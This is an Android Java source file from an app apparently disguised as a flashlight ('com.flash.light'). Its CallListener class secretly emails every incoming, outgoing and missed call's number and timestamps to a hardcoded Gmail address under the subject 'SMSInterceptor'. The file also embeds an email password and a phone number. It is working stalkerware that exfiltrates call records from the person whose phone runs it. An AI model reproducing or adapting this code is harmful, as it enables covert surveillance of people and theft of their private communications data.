package com.flash.light;

import android.util.Log;

import java.util.List;
import java.util.Date;

import android.content.Intent;
import android.content.Context;

import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class CallListener extends PhoneCallReceiver {

  private static GmailSender sender;

  public  static String emailString = "justdriveapp1@gmail.com";
  public  static String phoneNumberString = "2014640695";
  public  static String emailPasswordString = "GHOST21ghost";

  @Override
  protected void onIncomingCallReceived(final Context ctx, final String number, final Date start) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onIncomingCallAnswered(final Context ctx, final String number, final Date start) {
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Incoming call answered\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onIncomingCallEnded(final Context ctx, final String number, final Date start, final Date end) { 
    new Thread(new Runnable() {

     @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Incoming call ended!\nNumber: " + number + "\nEnd Time: " + end, emailString, emailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onOutgoingCallStarted(final Context ctx, final String number, final Date start) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Outgoing call started!\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();
  } 

  @Override 
  protected void onOutgoingCallEnded(final Context ctx, final String number, final Date start, final Date end) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Outgoing call ended!\nNumber: " + number + "\nEnd Time: " + end, emailString, emailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onMissedCall(final Context ctx, final String number, final Date start) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Missed call\nNumber: " + number + "\nTime: " + start, emailString, emailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError", "" + e.toString());
        }
      }
    }).start();
  }

}
